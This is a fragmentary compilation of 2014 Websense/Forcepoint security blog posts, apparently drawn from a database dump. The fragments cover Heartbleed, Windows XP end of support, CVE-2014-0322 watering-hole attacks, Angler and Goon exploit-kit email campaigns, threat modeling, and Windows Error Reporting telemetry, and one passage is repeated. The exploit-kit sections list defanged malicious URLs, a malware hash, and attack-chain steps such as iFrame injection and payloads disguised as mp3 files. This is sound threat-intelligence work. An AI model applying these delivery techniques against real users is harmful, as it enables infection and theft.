and, as they know about the Heartbleed bug, they go onto change their password. Additionally, the use of sessions can expose your credentials so you\'re not safe just because a login page wasn\'t displayed.\n\nAlmost universally, the security mechanisms that we depend upon are based around trust in both cryptography and its implementation. This vulnerability has demonstrated the risk that can be associated with such ubiquitous adoption of a single implementation of a cryptography library (in this case, OpenSSL) and demonstrates the value for organizations to utilize a layered defense-in-depth strategy whenever possible.', 'https://www.forcepoint.com/security-labs/broken-hearted-practical-look-heartbleed-vulnerability\n');

The end of Windows XP support should not come as a surprise to most users. Microsoft has a long history of ending support for variations of its operating systems. Although the company published a lifecycle chart showing the anticipated end-of-support dates for their OS, and despite the somewhat feverish rush to upgrade systems in many industries, Websense Security Labs telemetry indicates that XP is still widely deployed. Research suggests that Windows XP remains the second most popular operating system globally.\n\nWhat does this mean for the threat landscape?\n\nAny complex piece of software will contain vulnerabilities for cybercriminals to exploit. Operating systems and their associated applications are particularly prone to vulnerabilities because:\n\nIt is incredibly challenging to conduct testing on all code routes due to the sheer complexity and vastness of the code.\n	After a vulnerability is identified, a fix needs to be created and patched.\nMalware authors often look to discover vulnerabilities, known as zero-day exploits, before software vendors or the security community are aware. Microsoft has been enhancing, updating and supporting Windows XP for close to 13 years. Over time, the industry identified hundreds of Windows XP common vulnerabilities and exposures (CVEs), including a new zero-day last week. Affecting Windows XP, it allowed remote code execution through a rich text format (RTF).\n\nI am sure we will continue to see new Windows XP vulnerabilities. The only way to previously address Windows XP vulnerabilities was through the updating and patch process. Now that important line of defence is gone. With Microsoft ending support for Windows XP those patches will not be available.\n\nOpportunistic cybercriminals have shown a penchant for pwning the low hanging fruit. If XP is the fruit, after April 8 this plum is effectively sitting on the ground. End-of-support means no new software updates. The term \"forever-day\" reflects the fact that zero-day vulnerabilities will remain unpatched forever more.\n\nWebsense Security Labs Recommendation\n\nWe have always recommended that organisations not rely on software patches alone to protect themselves. We highly recommend upgrading your operating system at your earliest convenience.\n\nMalware authors know that businesses and consumers are still running Windows XP. These systems are especially vulnerable after April 8. We don\'t expect malware authors to unleash exploit code targeting these zero-days in the first few days after April 8.

We\'ve seen this latest zero-day employed by targeted attacks involving a cybersquatted domain that appeared to target the French Aerospace Association, as we described in our previous blog post on the subject. Since then, exploit instances utilizing CVE-2014-0322 have been carried out in crimeware attacks in the wild, and it seems that the exploit source code used in the initial attacks was made available publicly, which contributed to the usage of the zero-day.\n\nThe exploit code availability in the public domain led to additional exploit instances popping up in the wild and was seen coming from compromised websites by actors that were looking to make a quick profit from the security hole. In this blog, we\'re going to take a look at the initial cybersquatted website used to employ the zero-day and different high-profile websites that served the zero-day for crimeware propagation. Specifically, we\'re going to look at the lure stage of the attacks to understand how code was used in that stage with the ultimate aim of redirecting victims to the exploit. \nTop websites seen injected with malicious code leading to the exploit utilizing CVE-2014-0322: \ngifas.assso.net - Impersonating GIFAS French Aerospace Association website (http://gifas.asso.fr), hosted in Santa Clara, CA\nhatobus.co.jp - Japanese Travel Website, hosted in Tokyo, Japan\nenglish.com.tw - Taiwanese English School, Hosted in San Antonio, Texas, USA\nchemistry.hku.hk - Hong Kong University Chemistry Dept, Hosted in Hong Kong, China\nvfw.org - Veterans of Foreign Wars, Hosted in Blue Springs, Missouri, USA\nThe initial lure and attack vector - cybersquatted domain @ hxxp://gifas.assso.net\nThe lure in the initial attacks appears to have been a cybersquatted domain, @ hxxp://gifas.assso.net, taking advantage of the legitimate domain, hxxp://gifas.asso.fr, that is part of the  French Aerospace Association. The attack effectively employed the fake domain with some copied content from the legitimate website along with an additional *iFrame* the led to the exploit located on the same host at hxxp://gifas.assso.net/include.html. We can see that there are still references on the cybersquatted website that the code was copied from another website in the form of a \"watermark\" tag below the iFrame that indicates <!-- saved from ...\n[click to enlarge]\n\nThe fake gifas.assso.net is hosted on IP address 147.255.229.61. This IP seems to host some other hosts with malicious code. We found the IP hosted update19.homelinux.org, which is an exact replica of gifas.assso.net and is probably a test bed before launching the actual attack.\nHigh-profile compromises utilizing CVE-2014-0322\nAs described, the code that manages to exploit CVE-2014-0322 was available publicly and from that point, it\'s very easy for different actors to employ or more like \"copy and paste\" the exploit code and to change the dropper payload to what they desire to infect users with. Of course, different lure websites are needed to be utilized to propagate infections. One of the best ways to achieve that is through compromised websites and by seamlessly redirecting browsing users to the exploit, a very common method used in the crimeware domain for years. Websense Security Labs™ noticed that there were some website injections that utilized CVE-2014-0322. In this case, in particular, we noticed that what will bring the best form of \"revenue\" to the actors behind those infections is not necessarily the quantity of compromised websites the exploit is served from, but rather, the quality, or in other words, the popularity of the compromised websites actors manage to get under their control can play a big part in maximizing the number of infections, and indeed we saw some popular websites utilizing this new zero-day in various ways. \nA high profile website injected with code leading to the zero-day was a very popular transportation website in Japan called \"Hatbus\" @ hxxp://www.hatobus.co.jp/ which was first spotted by security researcher @PhysicalDrive0 on Feb 23rd 2014. \"Hatbus\" offers local residents and tourists bus travel information and other travel services. The website enjoys a weekly visit count of ~25,000 visits with a substantial amount if its traffic originating from referrals of other top travel websites in Japan:\n\n\n\n\n\n\n[Images above are courtesy of similarweb.com]\n\nAt the moment, hatobus.co.jp appears to be down for maintenance with a message letting us know that the website has been breached. Looking at some telemetry, we can confirm that the website was breached and served code leading to the exploit utilizing CVE-2014-0322 through a sneaky iFrame. The iFrame that seamlessly redirected browsing users to the exploit was buried in one of the Javascript files that were served by the web server specifically at hxxp://www.hatobus.co.jp/js/rollover.js. All it required was a one liner that writes an iFrame to the page to achieve the mischief: \n\n[click to enlarge]\n\n\nInterestingly enough, the exploit code was hosted on hatobus.co.jp as well, @ hxxp://www.hatobus.co.jp/images/ie.html, which means that the browsing user is lured and exploited under one domain. This approach takes the punch out of some security solutions since no suspicious redirects to other websites are in play. All the attack stages are served from one domain from start to finish.\n\nMaking it a classic case of a copycat, it was observed that the exploit code was identical to the one that was used by the cybersquatted website gifas.assso.net, but with one difference: there was an additional exploit served aimed at Java users and a counter set by the attackers to know exactly how many visiting users hit their malicious script. The Java exploit was referenced by an additional iFrame that would load a JAR file to take advantage of CVE-2013-2465. Upon successful exploitation, a file is dropped that appears to be a Banker that specifically targeting users of those Japanese banking websites: jp-bank.japanpost.jp & mizuhobank.co.jp.\n\n[click to enlarge]\n\n\nAdditional high-profile websites that got compromised and served a \"copycat\" exploit for CVE-2014-0322 were the Taiwanese English School website (hxxp://www.english.com.tw) and the Hong Kong University Chemistry Department (hxxp://www.chemistry.hku.hk), the latter was again a case of using an iFrame to redirect browsing users to a copy of the exploit. It\'s interesting to note that on the Taiwanese English School website, the exploit was actually included on the *main* page of the website and no iFrame or other forms of redirect were encompassed. This bold approach has been seen before on compromised websites, however it\'s rare to see an exploit utilized in such a manner:  \n\n[click to enlarge]\n\n\n\nIt\'s evident that the repercussions of exploit code of an unpatched vulnerability that found its way to the public domain can have quite an impact; exploit code that has been crafted for a targeted attack is virtually later on copied and used to drop crimeware binaries. We could see that the exploit code for CVE-2014-0322 was encompassed and served in a variety of ways as it \"evolved\" in scale: starting from being utilized on a cybersquatted lure website used in a low-volume and selected \"under the radar\" targeted attacks to being served through hidden iframes and exploit code that was directly placed on compromised websites with the ultimate aim to impact as many browsing users as possible with crimeware. \n\nThe usage of iFrame tags to seamlessly redirect users to malicious code is an old and popular method especially when a compromised website is used as a lure; iFrames are still used widely for legitimate purposes over the web. We don\'t see a reason why this trend will cease to be a popular choice as a way to redirect to malicious code by malware actors. This on-going and quite old trend may raise some questions from the defensive side: how can the ongoing phenomena of malicious iFrames be answered? They have long been a popular method of choice in the arsenal of actors behind crimeware and targeted attacks. To tackle the subject, one requires a close familiarity with the \"ins and outs\" of the web. It\'s a challenge to distinguish a legitimate iFrame from a malicious one since both may have similar suspicious traits. However, it is possible to distinguish malicious iFrames from legitimate by calculating the probability of a malicious outcome through the different contexts that are available in real-time. The more context available, the better the accuracy can be; context can be, for example, where is the iFrame leading the user to? What are the different iFrame tag features? What website served the iFrame? Is it in a risk category? Was it compromised before? Websense Advanced Classification Engine, or ACE, has a dedicated engine designated to detect malicious iFrames and can assess the context of an iFrame and if the elements are found to pose a potential risk the redirection to the iFrame is blocked in real-time; the approach is done through embedding a machine learning algorithm that allows ACE to reach a decision (see image of simplified process below). \n\nWhile it\'s important to employ security solutions to protect against cyber-attacks, it\'s also important to remember to update your local software and patch your operating system.

In fact, you could potentially be one. What if, buried deep inside is a smart intruder who knows how to break into your network and steal information? You and your colleagues are the perfect cybercriminals. You know your coworkers; you have network access; you know the network’s weaknesses better than anyone—so why aren’t more CSOs taking advantage of this group intelligence?\nYour internal intelligence – and thinking like an adversary – are the keys to insulating your system against threats. I can’t stress enough the importance of using that internal intelligence to shore up your overall security program. I am always surprised by the number of CSOs who haven’t leveraged the security threat modeling process. It’s by far one of the most underused tools in the industry.\nThreat Modeling Defined\n  Let’s take a step back and define threat modeling for the context of this article. Threat modeling is the understanding of how a threat actor (external, internal, malicious or abusive) can attack a specific asset (system or data). By way of illustration, I have seen a threat model scenario that focuses on “brand reputation.” The purpose of this model is to identify key assets that if compromised or made unavailable, would significantly impact business.\nSo let’s begin investigating the threats that may affect your business. As a starting point, I would begin by examining threat vectors/actors you see in your own industry, organization, peer groups and company use of social media. This audit will result in a good list of threats you can begin to model. Security threat modeling, the practice of identifying your weakest vulnerabilities and figuring out how to block criminal activity, is putting this intelligence into practice.\nThreat and attack modeling is a critical step to understanding which assets are most likely to be targeted, who is after your information, and how they might gain access and escape with your information. This type of modeling is different than testing applications; it evaluates the ecosystem, processes and the circumvention of ecosystem protections. When done correctly it’s one of the best opportunities to evaluate and understand the vulnerabilities in your solutions, systems and data security.\nNow it’s time to identify a short list of top threats. Once the top threats are identified, work backwards to identify the attack process and steps necessary to conduct a successful attack on a specific asset. From there you can expand the activity to include areas where infiltration and exfiltration can occur during an attack.\nThreat modeling isn’t difficult. Your threat modeling process can be as simple or as complicated as you can support. Start off with simple threat models and use them as a means to train other team members and socialize the concept with other company stakeholders. Brainstorming your top weaknesses and selecting a focus area is an easy way to tap internal brain trust and secure participation. Another option is to identify a few different scenarios and do real testing. Ultimately, making this part of a company governance program is the ideal threat modeling result.\nSix Steps to Successful Threat Modeling:\n  1. Find the criminal masterminds in your organization. Approach the various technical teams you work with, for example: engineering, developers, analysts, architects, help desk and support. Choose individuals who think outside the box—and aren’t afraid to speak their minds. If you are threat modeling a process, start with a few business analysts, and ask them how they would circumvent their processes.\n2. How would you break in? Send this “criminal” crew an email asking them to brainstorm how they would break your system or products, and even the third-party solutions your organization uses. One week later bring them together, supply them with food and drinks, and have an open discussion. Ask each of them how they would kill your system, and then ask how they would hurt your system. Remember this is an open and frank discussion, gaps will be identified, so don’t take it personally. Most of my previous threat modeling sessions brought up gaps in our infrastructure, security plan and security incident response plan. The key is not to come up with solutions but just think about how an attacker could get in.\n3. Prioritize, prioritize and prioritize. It’s very easy to get overwhelmed with the scenarios your criminal crew devised. So take a deep breath and ask yourself: “Which of these scenarios is most likely to occur? Which will cause the most damage? What are our company crown jewels?” It might be inconvenient if your website is taken offline, but intellectual property theft would be crippling.\n4. Map your countermeasures. When you have a set of potential threat actors and models, you can start to understand your position. To do so you should start mapping in both active and passive countermeasures to help mitigate the threat at each stage of the model. For example: if someone phishes your organization through employees, you might need education (people), incident response (passive process), and anti-phishing technologies (active technologies).\n5. Implement the solution and test it. Now that you have the foundation, it’s time to plug your security gaps and test it. If you have the budget, ask an outside firm to do the testing. If not, leverage the “criminal crew.” After all, they are insiders. Either way this will provide some indicators of successful models and let you know where your security team needs to spend its time. To fill the gaps you also need to challenge your vendor partners. Let them know you’ve identified threat models against some of your top assets and would like to understand how they can help solve your business problem.\n6. Innovate. It’s imperative that CSOs revisit the threat modeling exercise at least once a quarter. Cybercriminals are constantly devising new creative ways to break in, circumvent your defenses and eradicate data. You need to stay ahead of them by working with your creative-thinking rock stars. They will be happy to help – just ask them.\n\n  I’ve seen this process work time and time again. Sometimes CSOs express reservations with this approach because of the perceived expense and manpower needed. Don’t let this be a roadblock. Remember, it doesn’t have to start complicated. My philosophy is simple: the time and expenses required for threat modeling is worth it. You will spend 10X that amount if your data is stolen or your business disrupted. When you look at it that way, it’s a no-brainer.', 'https://www.forcepoint.com/insights/security-threat-modeling-six-steps-success\n');

Once we know how to do something better, we will most likely do it better and build upon it. For example, consider the transformation and evolution of flight.\nWe started with a bike-like apparatus, moved on to a single-engine automobile, to a jet and eventually rocketed to the moon and back. Similarly, there have been a number of amazing security technologies and strategies that have developed over the last 20 years. While we don’t see remnants of the Wright Brothers flying apparatus on runways, many security professionals still use the same outdated security frameworks in today’s businesses. Far too many security leaders still make their security decisions based on old frameworks, risk models and compliance objectives instead of security.\nAs we continue the security journey, we should ask ourselves, what’s next? How should we evolve our thoughts, practices and execution to elevate our security programs and improve the performance of our apparatus, just like the pioneers of aviation? If I am thinking like a security pioneer, I know it is time to boldly go where few security professionals have gone. I will improve my program effectiveness, while adding some new items that make my efforts actionable and sustainable.\nOne of the best things an organization can do is to add threat and attack modeling to its framework. Modeling is nothing new, but unfortunately it is not used in most security organizations. Yet, it can be one of the secrets to success. In many cases it’s the key differentiator between the top security organizations regularly catching cybercriminals, versus the organizations struggling with ongoing data loss and programmatic challenges from bad actors.\nThe Security Journey\nThreat and attack modeling is truly one of the most underused tools in information security today. Many organizations haven’t begun the journey from an ad-hoc, infrastructure and compliance-based security program to the threat-focused, risk-based, data-centric security program that is needed to cope with today’s threats.\nToday’s most prevalent security programs are infrastructure-based. Infrastructure programs tend to focus most of their protections in the network or on the endpoint. These programs will also spend 80 percent of the security budget on firewalls, antivirus/endpoint security and intrusion prevention systems (IPS).\nWhen you are in the infrastructure stage of a security program’s maturity, the old, “people, process and technology” decisions have historically been good enough, because back then we were pioneering. But with today’s changes in the advanced threat landscape, this type of program is going to fail. We need to innovate and evolve our programs. No amount of next generation firewalls or next-generation IPS is going to save you. \nLet’s talk about the road to business risk-based security and how threat and attack modeling will help you get there while increasing security effectiveness. Threat and attack modeling is a critical step to understanding:\n\n    What assets are most likely to be targeted\n  \n  \n    What the threats are to those assets\n  \n  \n    Who the enemies are\n  \n  \n    How attackers would infiltrate your organization\n  \n  \n    If the attackers gained access to your assets, how they would exfiltrate the data\n  \nEach attack has phases with various decision points for infiltration and exfiltration. The advanced attack stagesinclude criminal recon, luring the victim to click, redirecting the traffic to a malicious site, executing an exploit kit, deploying a dropper file, attempting to call home and ultimately data theft.\nOnce the bad guy breaks in and has your data, he has some decisions to make about how he will get the data out. His options will depend on your security program’s sophistication and his level of expertise and persistence. He could send the data out via: email, http, FTP, USB, print or secure copy (SCP). Another common technique of the cybercriminal is to apply custom encryption to the data before sending it out. This will usually evade 95 percent of most companies’ controls and is being used every day to steal data from the Fortune 1,000.\nModeling often helps demonstrate the inadequacies of your current defenses. I frequently see an overinvestment in perimeter security, whether it be products, testing, or strategy. A good mix of perimeter combined with internal controls is a winning strategy. This is especially true when compared to the benefits of investments closer to your data, the crown jewels of your organization. Remember this is a chess match and we need to protect the king.\nThe second biggest mistake I see is the purchase and deployment of point solutions to prevent the advanced threat. Those point solutions place all emphasis on just one or two of the advanced attack stages without understanding the threat lifecycle.\nAfter identifying the top threats, you can logically begin breaking down what the specific steps of each attack will look like.

The white paper, entitled “Using Anomalies in Crash Reports to Detect Unknown Threats,” can be downloaded here: www.websense.com/crashAPTreport\n\n Alexander Watson, Director of Security Research, Websense, will present advanced findings related to this research at the 2014 RSA Conference in San Francisco. Join us for our session, \"Use Anomalies to Detect Advanced Attacks Before Bad Guys Use It Against You\" on Tuesday, February 25, 2014, at 4 p.m. PT.\n\nIn a previous blog post, we discussed how Microsoft Windows Error Reporting (WER), a.k.a. Dr. Watson, sends detailed telemetry to Microsoft  each time an application crashes or fails to update, or a hardware change occurs on the network. By correlating the data, we demonstrated how an attacker who was capable of intercepting this data could create a precise blueprint of the target’s hardware and software network. Attackers can use this intelligence to create tailored attacks with a high probability of success.\nBut those reports also got us thinking about ways we could use that wealth of data to enable security. Our first step in that direction involved releasing source code on GitHub that allows organizations to use Dr. Watson telemetry reports to identify incidents that could lead to data loss.\nOne of the biggest challenges in security today is the persistence of targeted attacks. How many highly publicized attacks were detected quickly? The fact is that most stay on a system for a long time before detection. We wanted to take our research a step further to see if we could create a new method of identifying previously unknown threats – attacks that have made it past organizations’ defenses – in a manner never before accomplished. \nWe hope this research encourages the industry to continue looking beyond analytic and signature-based defenses that are based on expert knowledge of known attacks, and begin integrating advanced anomaly and threat intelligence capabilities. This integration brings the ability to reveal new and targeted threats that pose an incredibly high risk to organizations.', 'https://www.forcepoint.com/security-labs/labs-research-using-anomalies-crash-reports-detect-unknown-threats\n');

The kits will exploit Java, Flash or Silverlight vulnerabilities and try to load an encrypted executable, to help evade detection.\nAlthough the attacks are large scale (Websense Cloud Email Security have detected and blocked a few hundreds of thousands of these messages per campaign burst), our telemetry shows a heavier focus on UK targets in the lure stage.\nThese campaigns might be attributed to the \"ru:8080\" a.k.a \"/news/\" gang which have been prominent users of BlackHole Exploit Kit, then Magnitude Exploit Kit, as described in our previous blog.\nThe related campaigns we have observed so far start with these lures:\nFake Skype messages\nwith subjects such as:\nYou received a new message from Skype voicemail service\n\n\nFake Evernote Messages\nWith subjects such as:\n\"Image has been sent\"\n\"Image has been sent <user@domain.tld>\"\n\nThey carry URLs such as:\nhxxp://itsrobinhoodd .com/1.html\nThese have a simple JavaScript to redirect to the next stage\n\nThe next stage is where the switch from Angler Exploit Kit to Goon Exploit Kit can be seen\nhxxp://merdekapalace .com/1.txt\nRedirected to the Angler Exploit Kit page, with the typical .ru:8080 hosts:\n\nhxxp://opheevipshoopsimemu .ru:8080/dp2w4dvhe2\nContains obfuscated code that checks for browser and plug-in versions, serves a corresponding exploit, then loads an executable encrypted using 64 bit Xor key encryption.\n\n\n\nOn the other hand, an attack leading to Goon Exploit Kit shows a different code in the redirect stage:\nThe same URL as before:\nhxxp://merdekapalace .com/1.txt\n\nhxxp://nedapardaz .com/theme/it/browser/_lzf_.php?source_pid=38896815737B1F0316DB020740&swap_src=7D&theme-lid=1\nLoads Java or SilverLight exploits\n\nThis ultimately downloads an encrypted executable disguised as an mp3, such as:\nhxxp://nedapardaz .com/9536.mp3\nA Visual Basic script (named papa.vbs) is downloaded into the browser\'s temporary file directory. When executed, the VB script decrypts the \"mp3\" file to an executable:\n\nThe executable decrypted from the \"mp3\" file has the following details (the name and hash are likely different upon each attack)\nN0Y6.exe\nSHA1: 577156efc37ef50cefa72db31e7c94a7e6d415db\nWebsense Threatscope behavioral analysis detects the executable as Malicious, see report here\n\nChecking in Virus Total to provide context about AV coverage for this malware, we can see detection when first seen is7/50, and it looks like a Zeus variant.\nFor analysis of a similar SilverLight exploit, see our previous blog post\nWe have seen evidence and reports of the \"ru:8080\" gang switching to Angler Exploit Kit as far back as December 2013, as independent researcher \"Kafeine\" mentioned in this post, but we have not noticed any large scale email attacks until recently (we have seen some web based attacks, in somewhat small scale). The \"ru:8080\" criminal gang typically pushes trojans such as Cridex, Zeus GameOver, Click-Fraud trojans like ZeroAccess, and we have seen instances in the past of Ransomware such as RansomLock and worms like Andromeda.\nIt looks like after a period of relatively little use of exploit kits, cyber criminals resume use of different exploit kits to deliver malware in email based attacks. However, the switch from one exploit kit to the other indicates several possibilities, one being that continuing to use a single Malware-as-a-Service for a long period is deemed too risky to maintain a profitable operation. Alternatively, the attackers are evaluating multiple exploit kits to determine which works the best, or multiple attackers may be leveraging the same bot-net and redirect structures.\nAnother somewhat interesting detail - according to Websense email telemetry, we see a relatively heavy bias from the attackers towards targets located in the UK, followed by US and Germany\n\nWebsense Protection\nWebsense customers are protected with ACE™, our Advanced Classification Engine in these stages of the attacks:\nStage 2 (Lure) - Websense Cloud Email Security and Email Security Gateway had proactive detection against the lure emails.

Just last week, a consultant working for the Korea Credit Bureau was arrested for allegedly stealing the credit card numbers, social security numbers, and personal details of more than 105.8 million accounts by copying them to a USB drive over an 11-month period. Other examples included the LA Times reporting that Edward Snowden used a USB drive to steal classified documents from the NSA.\nIn this blog we will discuss (and provide source code) to enable organizations to start protecting their sensitive data by harnessing intelligence from applications already running on their network. If you\'re ready to dive in now- go ahead and download the queries and lookups on GitHub now.\nBackground\nHow is it that an IT consultant was able to siphon account data with a USB drive from his company over an 11 month period? Most security solutions are based on the principle of perimeter defense and keeping the bad guys out. Traditional defenses such as firewalls, antivirus, intrusion prevention and sandboxing solutions do very little to protect against data theft from within a company, where an employee may wittingly or unwittingly steal intellectual property or other sensitive data, using valid credentials.\nA new breed of solutions designed to protect information, such as Websense\'s DLP (Data Leak Prevention) products are designed to work with existing security solutions and business policies to protect against deliberate or inadvertent transmission of a company\'s sensitive data from the network.\n\nHarnessing Application Telemetry to Protect Your Network\nAs we will discuss in this blog post, there are a number of that a company\'s security teams can do to detect suspicious activity which may be the result of data theft. In a previous blog post, we discussed how Microsoft Windows Error Reporting (WER), a.k.a. Dr. Watson, sends detailed telemetry to Microsoft each time an application crashes or fails to update, or a hardware change occurs on the network. We were surprised to learn that a USB drive insertion considered a hardware change, and that detailed information about the USB device and computer that it was plugged into being sent to Microsoft. These logs are sent to Microsoft via HTTP URL-encoded messages. Organizations can use knowledge about their content and how to decode these messages to detect USB drives and devices that could be a risk to the organization. This knowledge can help organizations detect USB drives and devices such as those used in the KCB and Snowden leaks, and automatically generate reports when they are plugged into a secure system. \nWe mentioned in the last blog post that the information sent as part of crash logs could be harnessed by organizations. Today we will demonstrate how you can harness intelligence from these crash logs to detect and monitor new USB devices being connected to the network, and hence gain insight into where your company\'s sensitive data is going. The best part of this? Your company can implement this monitoring for free.\n\nHow to know each time a new USB device is connected to your network\n\nIn Microsoft Windows environments, a report is sent to Microsoft each time a hardware change happens to a PC. This includes the times that a new USB device is plugged into a computer. In Windows Vista and later, these reports became automated and are part of an opt-out program that Microsoft estimates nearly 80% of PCs in the world participate in. Depending on your operating system, reports are encoded into a GET request to http://watson.microsoft.com (Win XP, Vista, 7) or https://watson.telemetry.microsoft.com in Windows 8.\n\nThese reports can be gathered in a variety of ways, either by examining outbound web proxy logs (may we shamelessly suggest Websense Triton Security Gateway), creating an IPS rule in an open source intrusion prevention system such as Snort or Suricata, or by simply monitoring a SPAN port using a sniffer such as Wireshark. In our last blog entry, we discussed an information leakage that can arise with these reports and suggested that organizations set up a group policy that sends reports to an on-premise server which then forces encryption before forwarding to Microsoft. In this case, the reports can be processed at the organization\'s WER (Windows Error Reporting) collection server.\n\nAs we show below, reports from Microsoft WER (Dr. Watson) can be a bit tricky to extract information from (we provide a detailed break-out of fields and and example of how to build reports in Splunk), so let\'s dive in.\n\nDr. Watson reports such as the one below have a specific report type for USB inserted devices. We can start by filtering down to messages containing \"PnPGenericDriverFound\". This is followed by additional information (some is URI encoded) that looks cryptic, but with some lookup tables can be broken out into the following fields:\n\nDate\n  USB Device Manufacturer\n  USB Device Identifier\n  USB Device Revision\n  Host computer - default language\n  Host computer - Operating system, 32/64-bit, service pack and update version\n  Host computer - Manufacturer, model and name\n  Host computer - Bios version and unique machine identifier\n\n\nStep 1: Create the Vendor and Product ID Lookups in your favorite SIEM tool\n\nIt turns out the Vendor and Device ID lookups can be a little tricky - but map exactly to Windows and Linux driver databases. To see an example for yourself, try typing \"lsusb\" from a Linux machine.

Just last week, a consultant working for the Korea Credit Bureau was arrested for allegedly stealing the credit card numbers, social security numbers, and personal details of more than 105.8 million accounts by copying them to a USB drive over an 11-month period. Other examples included the LA Times reporting that Edward Snowden used a USB drive to steal classified documents from the NSA.\nIn this blog we will discuss (and provide source code) to enable organizations to start protecting their sensitive data by harnessing intelligence from applications already running on their network. If you\'re ready to dive in now- go ahead and download the queries and lookups on GitHub now.\nBackground\nHow is it that an IT consultant was able to siphon account data with a USB drive from his company over an 11 month period? Most security solutions are based on the principle of perimeter defense and keeping the bad guys out. Traditional defenses such as firewalls, antivirus, intrusion prevention and sandboxing solutions do very little to protect against data theft from within a company, where an employee may wittingly or unwittingly steal intellectual property or other sensitive data, using valid credentials.\nA new breed of solutions designed to protect information, such as Websense\'s DLP (Data Leak Prevention) products are designed to work with existing security solutions and business policies to protect against deliberate or inadvertent transmission of a company\'s sensitive data from the network.\n\nHarnessing Application Telemetry to Protect Your Network\nAs we will discuss in this blog post, there are a number of that a company\'s security teams can do to detect suspicious activity which may be the result of data theft. In a previous blog post, we discussed how Microsoft Windows Error Reporting (WER), a.k.a. Dr. Watson, sends detailed telemetry to Microsoft each time an application crashes or fails to update, or a hardware change occurs on the network. We were surprised to learn that a USB drive insertion considered a hardware change, and that detailed information about the USB device and computer that it was plugged into being sent to Microsoft. These logs are sent to Microsoft via HTTP URL-encoded messages. Organizations can use knowledge about their content and how to decode these messages to detect USB drives and devices that could be a risk to the organization. This knowledge can help organizations detect USB drives and devices such as those used in the KCB and Snowden leaks, and automatically generate reports when they are plugged into a secure system. \nWe mentioned in the last blog post that the information sent as part of crash logs could be harnessed by organizations. Today we will demonstrate how you can harness intelligence from these crash logs to detect and monitor new USB devices being connected to the network, and hence gain insight into where your company\'s sensitive data is going. The best part of this? Your company can implement this monitoring for free.\n\nHow to know each time a new USB device is connected to your network\n\nIn Microsoft Windows environments, a report is sent to Microsoft each time a hardware change happens to a PC. This includes the times that a new USB device is plugged into a computer. In Windows Vista and later, these reports became automated and are part of an opt-out program that Microsoft estimates nearly 80% of PCs in the world participate in. Depending on your operating system, reports are encoded into a GET request to http://watson.microsoft.com (Win XP, Vista, 7) or https://watson.telemetry.microsoft.com in Windows 8.\n\nThese reports can be gathered in a variety of ways, either by examining outbound web proxy logs (may we shamelessly suggest Websense Triton Security Gateway), creating an IPS rule in an open source intrusion prevention system such as Snort or Suricata, or by simply monitoring a SPAN port using a sniffer such as Wireshark. In our last blog entry, we discussed an information leakage that can arise with these reports and suggested that organizations set up a group policy that sends reports to an on-premise server which then forces encryption before forwarding to Microsoft. In this case, the reports can be processed at the organization\'s WER (Windows Error Reporting) collection server.\n\nAs we show below, reports from Microsoft WER (Dr. Watson) can be a bit tricky to extract information from (we provide a detailed break-out of fields and and example of how to build reports in Splunk), so let\'s dive in.\n\nDr. Watson reports such as the one below have a specific report type for USB inserted devices. We can start by filtering down to messages containing \"PnPGenericDriverFound\". This is followed by additional information (some is URI encoded) that looks cryptic, but with some lookup tables can be broken out into the following fields:\n\nDate\n  USB Device Manufacturer\n  USB Device Identifier\n  USB Device Revision\n  Host computer - default language\n  Host computer - Operating system, 32/64-bit, service pack and update version\n  Host computer - Manufacturer, model and name\n  Host computer - Bios version and unique machine identifier\n\n\nStep 1: Create the Vendor and Product ID Lookups in your favorite SIEM tool\n\nIt turns out the Vendor and Device ID lookups can be a little tricky - but map exactly to Windows and Linux driver databases. To see an example for yourself, try typing \"lsusb\" from a Linux machine. After scraping some online driver databases, we put together a lookup script that you can use for vendors and device codes that you can download on GitHub.

INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (292, 'Q&A: Windows Error Reporting Could Inadvertently Aid Cybercriminals', 'Alexander WatsonSean BergVinny SharmaForcepoint ', '\n      \n    \n      \n      \n   ', 'We recently released significant research detailing what information cybercriminals can gain with access to clear text telemetry reports from widely deployed applications, such as Windows Error Reporting (WER). Armed with this intelligence, attackers can map a precise blueprint of the target’s hardware and software network, which can be used to create tailored attacks with a high probability of success.\nA few folks have asked questions, including how often these reports are generated and how they might be intercepted. Below I have provided additional insight.\nWhat is Windows Error Reporting?\nWindows Error Reporting (WER) is a crash reporting technology introduced by Microsoft with Windows XP and features fully automated reporting (opt-out for some features) in Windows Vista, Windows 7 and Windows 8. The program kicks in when it detects a problem with a piece of software or hardware, such as an application crash. To improve Microsoft products, a bug/crash report is sent back to Redmond.\nWebsense research indicates that WER in Windows XP, Windows Vista and Windows 7 sends specific information about applications, services and hardware, with the first stage of reporting commonly being sent in HTTP clear-text. Windows 8 sends data in the same format but uses industry best practices with TLS encryption for all data. While we are all familiar with the application crash report that prompts users to share details with Microsoft, other automated (opt-out) reports include events such as failed application updates and USB device insertions. A large percentage of these reports are sent in http clear-text to Microsoft, which risks exposure of highly detailed software and hardware architecture information to attackers. Follow-on reporting stages, that provide additional information such as application crash mini-dumps that may contain PII (personally identifiable information), are always encrypted using SSL/TLS.\nWhat types of intelligence do these reports show?\nApplication telemetry data is commonly unencrypted and can provide cybercriminals with the following intelligence over time:\n\nThe make and model of every PC on the corporate network\n    A list of every application and their versions installed on the computer\n    The specific machine ID of every computer\n    The operating system, service pack and updates installed\n    The BIOS version of the computer\n    All browsers (and their versions, extensions, apps and plug-ins) on these devices\n    A detailed breakout of every USB device that has been plugged into enterprise computers, version information and details about the PC it is connected to\nWhy does this matter to you?\nMicrosoft estimates that up to 80 percent of all network connected PCs use WER. That\'s more than one billion endpoints worldwide. These reports are incredibly valuable to Microsoft and other application vendors to ensure quality of their products. Secondly, it is our hope that with increased awareness, IT security teams will be able to harness these reports to learn more about their own networks. On the flip side, WER provides the same key information that hackers search for to identify and exploit vulnerable systems such as OS, service pack and update versions. Crash information is useful for both attackers and the security community as they may pinpoint a new exploitable code flaw for a zero-day attack.\nHow can cybercriminals access these reports?\nOn the Websense Security Labs blog, we have documented the type of in-depth system profiling that is possible from these clear text reports. Information is the most vulnerable when it is in transit to Microsoft, passing through various appliances and ISPs. Below are two ways that an attacker could possibly get access to this information:\n\nCollect the data upstream from the target – most likely at an Internet Service Provider (ISP) that is not trusted. This threat is particularly risky for large organizations with a multi-national footprint.\n    Third-party security vendors, security appliances and browser plug-ins may collect and report this information independently.\n    The first scenario is perhaps the most worrisome because it occurs well off-premise.\nHow often are crash reports generated?\nIf you are interested in how many times your PC has recently generated crash reports, open up Control Panel -> System and Security -> Action Center -> Problems and Reports.\nAs I mentioned in the original Websense Security 